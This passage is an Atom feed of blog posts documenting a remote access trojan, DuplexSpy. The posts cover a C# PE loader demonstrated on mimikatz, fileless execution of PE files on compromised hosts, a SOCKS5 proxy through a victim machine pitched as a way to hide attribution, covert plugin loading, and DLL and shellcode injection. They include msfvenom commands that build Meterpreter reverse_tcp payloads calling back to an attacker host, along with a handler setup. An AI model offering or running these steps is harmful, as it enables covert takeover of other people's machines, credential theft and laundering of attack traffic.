<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iss4cf0ng/ISSAC&#39;s blog</title>
  
  <subtitle>CyberSecurity blog</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2026-02-06T15:13:12.391Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ISSAC</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.</title>
    <link href="http://example.com/2026/02/06/2026-2-6-ToolDotNetPELoader/"/>
    <id>http://example.com/2026/02/06/2026-2-6-ToolDotNetPELoader/</id>
    <published>2026-02-06T14:33:48.000Z</published>
    <updated>2026-02-06T15:13:12.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Recently, when I was developing a fileless execution method for <a href="https://github.com/iss4cf0ng/DuplexSpyCS">DuplexSpy RAT</a> version 2, I could hardly find a C#-based x86 PE loader.<br>Most existing implementations I found were x64-only, such as the one developed by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a></p><p align="center" class='item-img' data-src='/images/meme/mika_neko.png'><img src="/images/meme/mika_neko.png" width="300"></p><p>Therefore, I decided to develop a C#-based x86 PE loader myself.</p><p>This console application allows you to load either x86 or x64 PE files into memory.<br>First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file.</p><p>An x64 PE cannot be loaded by an x86 loader, and vice versa.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/dotNetPELoader">here</a>  </p><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul><li>Load <strong>x86 PE in x86 process</strong></li><li>Load <strong>x64 PE in x64 process</strong></li><li>Handles relocation and import resolving</li><li>Fully written in C#</li></ul><p>If you find this project useful, a ⭐ would be appreciated.</p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/mika_cute.jpg'><img src="https://iss4cf0ng.github.io/images/meme/mika_cute.jpg" width="200"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 x64_file.exe<br>dotNetPELoader.exe --x86 x86_file.exe<br>dotNetPELoader.exe --coffee<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/hello.png'><img src="/images/article/tools/dotNetPELoader/hello.png" width="600"></p><h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="x64-mimikatz"><a href="#x64-mimikatz" class="headerlink" title="x64 - mimikatz"></a>x64 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/anycpu.png'><img src="/images/article/tools/dotNetPELoader/anycpu.png" width="600"></p><p>If you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 mimikatz<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.1.png'><img src="/images/article/tools/dotNetPELoader/x64.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.2.png'><img src="/images/article/tools/dotNetPELoader/x64.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.3.png'><img src="/images/article/tools/dotNetPELoader/x64.3.png" width="600"></p><h2 id="x86-mimikatz"><a href="#x86-mimikatz" class="headerlink" title="x86 - mimikatz"></a>x86 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86_cpu.png'><img src="/images/article/tools/dotNetPELoader/x86_cpu.png" width="600"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x86 mimikatz<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.1.png'><img src="/images/article/tools/dotNetPELoader/x86.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.2.png'><img src="/images/article/tools/dotNetPELoader/x86.2.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/rio_pc.jpg'><img src="/images/meme/rio_pc.jpg" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Recently, when I was developin</summary>
      
    
    
    
    <category term="Tools" scheme="http://example.com/categories/Tools/"/>
    
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Fileless Execution" scheme="http://example.com/tags/Fileless-Execution/"/>
    
    <category term="PE Loader" scheme="http://example.com/tags/PE-Loader/"/>
    
    <category term="PE File" scheme="http://example.com/tags/PE-File/"/>
    
    <category term="x86" scheme="http://example.com/tags/x86/"/>
    
    <category term="x64" scheme="http://example.com/tags/x64/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Fileless Execution</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyFilelessExec/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyFilelessExec/</id>
    <published>2026-02-03T15:42:02.000Z</published>
    <updated>2026-02-06T11:59:00.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the <strong>Fileless Execution</strong> feature of DuplexSpy.</p><p>This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.</p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.</p><p>The figure below illustrates the execution flow:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/procedure.svg'><img src="/images/article/tools/duplexspy/fileless/procedure.svg" width="1000"></p><p>The x64 version of PE loader is based on the implementation by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a>. However, I have developed the <a href="https://github.com/iss4cf0ng/dotNetPELoader">x86 version</a> in case the C# payload uses the x86 platform.</p><p>Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="300"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Example-1-x64-msfvenom"><a href="#Example-1-x64-msfvenom" class="headerlink" title="Example 1 - x64 msfvenom"></a>Example 1 - x64 msfvenom</h2><p>First, check the architecture of the executed payload:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.1.png'><img src="/images/article/tools/duplexspy/fileless/check.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.2.png'><img src="/images/article/tools/duplexspy/fileless/check.2.png" width="700"></p><p>Generate an x64 Messagebox payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.1.png'><img src="/images/article/tools/duplexspy/fileless/msf.1.png" width="700"></p><p>The <code>x64.exe</code> is executed successfully without being written to disk. This is fileless execution. Next, check the process list:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist | find &quot;client.exe&quot;<br></code></pre></td></tr></table></figure><p>Here <code>client.exe</code> is your DuplexSpy payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.2.png'><img src="/images/article/tools/duplexspy/fileless/msf.2.png" width="700"></p><p>Two instance of <code>client.exe</code> (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.3.png'><img src="/images/article/tools/duplexspy/fileless/msf.3.png" width="700"></p><h2 id="Example-2-x86-meterpreter"><a href="#Example-2-x86-meterpreter" class="headerlink" title="Example 2 - x86 meterpreter"></a>Example 2 - x86 meterpreter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.4.png'><img src="/images/article/tools/duplexspy/fileless/msf.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.5.png'><img src="/images/article/tools/duplexspy/fileless/msf.5.png" width="700"></p><h2 id="Example-3-x86-calc-exe"><a href="#Example-3-x86-calc-exe" class="headerlink" title="Example 3 - x86 calc.exe"></a>Example 3 - x86 calc.exe</h2><p>Now, try executing a more complex application:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/calc.1.png'><img src="/images/article/tools/duplexspy/fileless/calc.1.png" width="500"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="DuplexSpy" scheme="http://example.com/categories/DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="Fileless Execution" scheme="http://example.com/tags/Fileless-Execution/"/>
    
    <category term="Document" scheme="http://example.com/tags/Document/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] SOCKS5 Proxy</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyProxy/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyProxy/</id>
    <published>2026-02-03T12:19:31.000Z</published>
    <updated>2026-02-06T11:58:35.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the proxy feature of DuplexSpy.</p><p>This feature allows you to use a compromised machine as a proxy, meaning that all network traffic from your machine can be forwarded through the compromised host. </p><p>Even if a compromised machine does not store sensitive data, it can still be abused as a proxy or relay node for malicious activities, such as forwarding <strong>SSH</strong> sessions. This allows threat actors to hide their real origin and reduce the risk of attribution.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/1.png'><img src="/images/article/tools/duplexspy/proxy/1.png" width="1000"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>A C2 server starts listening on one or more ports and accepts SOCKS5 connections from proxy users. The C2 server redirects the user’s network stream to a compromised machine, which then forwards the traffic to the target host. All DNS resolution is performed on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>In this example, I demonstrates the proxy feature through SSH and proxychains.  The following table describes the experimental environment:</p><div class="table-container"><table><thead><tr><th>Host</th><th>OS</th><th>Description</th></tr></thead><tbody><tr><td>10.98.225.138</td><td>Ubuntu VM</td><td>Target host. It has enabled SSH service. An important file is stored at <code>~/Desktop/foo.txt</code>.</td></tr><tr><td>10.98.222.136</td><td>Windows 10 x64</td><td>Compromised machine.</td></tr><tr><td>10.98.241.11</td><td>Debian Kali Linux</td><td>Attacker machine.</td></tr><tr><td>10.98.253.150</td><td>Windows 10</td><td>Attacker’s C2 server.</td></tr></tbody></table></div><p>Start the DuplexSpy C2 server:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/2.png'><img src="/images/article/tools/duplexspy/proxy/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/3.png'><img src="/images/article/tools/duplexspy/proxy/3.png" width="700">    <figcaption>    Right click the compromised host and select <b>Proxy</b>    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/4.png'><img src="/images/article/tools/duplexspy/proxy/4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/5.png'><img src="/images/article/tools/duplexspy/proxy/5.png" width="400">    <figcaption>    You should use an unused port.    </figcaption></p><p>Next, establish an SSH connection from Kali Linux to the target host <code>10.98.225.138</code>.</p><p>Configure the proxychains:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/6.png'><img src="/images/article/tools/duplexspy/proxy/6.png" width="500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ proxychains ssh sdksdk@10.98.225.138<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/7.png'><img src="/images/article/tools/duplexspy/proxy/7.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/8.png'><img src="/images/article/tools/duplexspy/proxy/8.png" width="700"></p><p>Now, check the source IP address on the target host:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat -ano | grep &quot;:22&quot;<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/9.png'><img src="/images/article/tools/duplexspy/proxy/9.png" width="800"></p><p>The source address is <code>10.98.222.136:54372</code>, which belongs to the compromised machine.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="DuplexSpy" scheme="http://example.com/categories/DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="SOCKS5" scheme="http://example.com/tags/SOCKS5/"/>
    
    <category term="Proxy" scheme="http://example.com/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Using and Developing a Plugin.</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyPlugin/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyPlugin/</id>
    <published>2026-02-03T12:18:50.000Z</published>
    <updated>2026-02-08T04:56:00.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>DuplexSpy provides a simple remote plugin manager that allows you to load customized plugins into a compromised machine without writing them to disk.</p><p>This article describes how to use and develop a custom plugin for DuplexSpy.</p><p>Note that all plugins are implemented using .NET Framework 4.8 for compatibility reasons.</p><p>The plugin manager interface provides a GUI ListView and a console.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/1.png'><img src="/images/article/tools/duplexspy/plugin/1.png" width="700"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends the raw DLL bytes of plugin assemblies to the compromised machine. The payload loads these assemblies into memory using the <code>Assembly.Load()</code> method and stores their interfaces in a read-only dictionary. The payload can invoke plugin interfaces and pass parameters whenever it receives commands from the C2 server.</p><p>When the payload is terminated, all loaded plugins are automatically released by the system.</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>The plugin console provides the following commands:</p><table>  <thead>    <tr>      <th>Command</th>      <th>Description</th>    </tr>  </thead>  <tbody>    <tr>      <td><code>clear</code></td>      <td>Clear the console output.</td>    </tr>    <tr>      <td><code>show</code></td>      <td>List all available plugins under the plugin folder.</td>    </tr>    <tr>      <td><code>loaded</code></td>      <td>Show all currently loaded plugins.</td>    </tr>    <tr>      <td><code>load &lt;all | plugin name&gt;</code></td>      <td>Load specified plugin.</td>    </tr>    <tr>      <td><code>unload &lt;all | plugin name&gt;</code></td>      <td>Unload the specified plugin.</td>    </tr>    <tr>      <td><code>&lt;entry&gt; &lt;param1&gt; &lt;param2&gt; ...</code></td>      <td>Use specified plugin with parameters.</td>    </tr>  </tbody></table><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/2.png'><img src="/images/article/tools/duplexspy/plugin/2.png" width="700"></p><h2 id="Example-1-Coffee"><a href="#Example-1-Coffee" class="headerlink" title="Example 1 - Coffee"></a>Example 1 - Coffee</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee help<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.1.png'><img src="/images/article/tools/duplexspy/plugin/coffee.1.png" width="700"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee print=1<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.2.png'><img src="/images/article/tools/duplexspy/plugin/coffee.2.png" width="700"></p><p>Note that the <strong>Plugin Manager</strong> throws an exception if an unhandled exception occurs inside a plugin and displays the corresponding error message. However, the payload itself will not be terminated.</p><h2 id="Example-2-Dumper"><a href="#Example-2-Dumper" class="headerlink" title="Example 2 - Dumper"></a>Example 2 - Dumper</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.1.png'><img src="/images/article/tools/duplexspy/plugin/dumper.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.2.png'><img src="/images/article/tools/duplexspy/plugin/dumper.2.png" width="700"></p><h2 id="Example-3-InfoSpyder"><a href="#Example-3-InfoSpyder" class="headerlink" title="Example 3 - InfoSpyder"></a>Example 3 - InfoSpyder</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/infospyder.1.png'><img src="/images/article/tools/duplexspy/plugin/infospyder.1.png" width="700"></p><h1 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h1><p>To develop a plugin. Firstly, create a new .NET framework 4.8 library project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.1.png'><img src="/images/article/tools/duplexspy/plugin/dev.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.2.png'><img src="/images/article/tools/duplexspy/plugin/dev.2.png" width="600">    <figcaption>    Any name that you like. This name is regardless for the final result.    </figcaption></p><p>Add a reference <code>Plugin.Abstractions48</code>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.3.png'><img src="/images/article/tools/duplexspy/plugin/dev.3.png" width="600">    <figcaption>    Right click your project -> Add -> Reference    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.4.png'><img src="/images/article/tools/duplexspy/plugin/dev.4.png" width="600">    <figcaption>    Plugin.Abstractions48    </figcaption></p><p>Don’t forget to use it in your project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.5.png'><img src="/images/article/tools/duplexspy/plugin/dev.5.png" width="600"></p><p>Add the required attributes and properties. The <code>HelpTable</code> is optional but recommended. The <code>Name</code> field must be a unique identifier for the plugin.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.6.png'><img src="/images/article/tools/duplexspy/plugin/dev.6.png" width="600"></p><p>Add the required functions:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.7.png'><img src="/images/article/tools/duplexspy/plugin/dev.7.png" width="600"></p><p>At this point, you have successfully developed a custom plugin. Before building the project, install <code>Costura.Fody</code> to ensure that all dependencies are merged into a single DLL, even if no additional NuGet packages are used.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.8.png'><img src="/images/article/tools/duplexspy/plugin/dev.8.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.9.png'><img src="/images/article/tools/duplexspy/plugin/dev.9.png" width="600"></p><p>Build the DLL file:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.10.png'><img src="/images/article/tools/duplexspy/plugin/dev.10.png" width="600">    <figcaption>    Right click your project -> Build    </figcaption></p><p>Move the generated DLL into the <code>.\Plugins</code> folder of DuplexSpy and create a JSON file <strong>WITH THE SAME FILE NAME (important)</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.11.png'><img src="/images/article/tools/duplexspy/plugin/dev.11.png" width="600"></p><p>The JSON file should be structured as follows. The <code>Name</code> field must match the plugin name defined in the code. The <code>Entry</code> field specifies the command name used in the plugin console. The <code>Command</code> field is reserved for future use.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.12.png'><img src="/images/article/tools/duplexspy/plugin/dev.12.png" width="600"></p><p>Go to DuplexSpy. Open <strong>Plugin</strong>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.13.png'><img src="/images/article/tools/duplexspy/plugin/dev.13.png" width="600"></p><p>Our <code>HelloWorld</code> plugin has been successfully installed. Now let’s try it in the console:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.14.png'><img src="/images/article/tools/duplexspy/plugin/dev.14.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.15.png'><img src="/images/article/tools/duplexspy/plugin/dev.15.png" width="600"></p><p>Congratulations! You have successfully developed and deployed a custom Duplex plugin.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;DuplexSpy provides a simple re</summary>
      
    
    
    
    <category term="DuplexSpy" scheme="http://example.com/categories/DuplexSpy/"/>
    
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
    <category term="Document" scheme="http://example.com/tags/Document/"/>
    
    <category term="Remote Plugin" scheme="http://example.com/tags/Remote-Plugin/"/>
    
    <category term=".NET" scheme="http://example.com/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] DLL and Shellcode Injection and Loader</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/</id>
    <published>2026-02-03T12:18:07.000Z</published>
    <updated>2026-02-06T11:59:10.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the DLL and shellcode injection features of DuplexSpy.</p><p>This feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process.</p><p>If you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#Chapter-21-Windows-Message-Hooking">reverse engineering</a> and <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/">Windows buffer overflow</a>.</p><h1 id="Injector"><a href="#Injector" class="headerlink" title="Injector"></a>Injector</h1><p>This features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work.</p><p>Note that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa.</p><p>DuplexSpy provides the following injection methods for both DLL and shellcode:</p><ul><li><strong>APC</strong></li><li><strong>Early Bird</strong></li><li><strong>CreateRemoteThread (default)</strong></li><li><strong>NtCreateThreadEx</strong></li><li><strong>ZwCreateThreadEx</strong></li></ul><p>Before performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder <code>C:\Windows\System32</code> are typically x64 binaries, while PE files under <code>C:\Windows\SysWOW64</code> are x86 binaries.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/1.png'><img src="/images/article/tools/duplexspy/injector/1.png" width="400"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h2><p>Notice that this method <strong>IS NOT</strong> fileless. A DLL file will be created under <code>%TEMP%</code> directory and might be detected or deleted by antivirus software.</p><p>The <code>CreateRemoteThread</code> method is recommended for DLL injection.</p><p>In this example, Kali Linux is used to establish a <strong>Meterpreter</strong> reverse TCP connection via DLL injection.</p><div class="table-container"><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td>Target process</td><td><code>C:\Windows\SysWOW64\notepad.exe</code></td></tr><tr><td>Kali host</td><td>192.168.1.192</td></tr><tr><td>Kali port</td><td>4444</td></tr></tbody></table></div><p>Build an <strong>x86</strong> payload using <strong>msfvenom</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll<br></code></pre></td></tr></table></figure></p><p><strong>Msfconsole:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfconsole<br>msf&gt; use exploit/multi/handler<br>msf&gt; set payload windows/meterpreter/reverse_tcp<br>msf&gt; set lhost 192.168.1.192<br>msf&gt; set lport 4444<br>msf&gt; run<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/msf.1.png'><img src="/images/article/tools/duplexspy/injector/msf.1.png" width="600"></p><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>Let’s try the <strong>CreateRemoteThread</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.1.png'><img src="/images/article/tools/duplexspy/injector/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.2.png'><img src="/images/article/tools/duplexspy/injector/dll.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.3.png'><img src="/images/article/tools/duplexspy/injector/dll.3.png" width="600"></p><p>Notice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload!</p><p>Next, exit your meterpreter session:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter&gt; exit<br></code></pre></td></tr></table></figure></p><p>Process <code>notepad.exe</code> is still running!</p><h3 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" 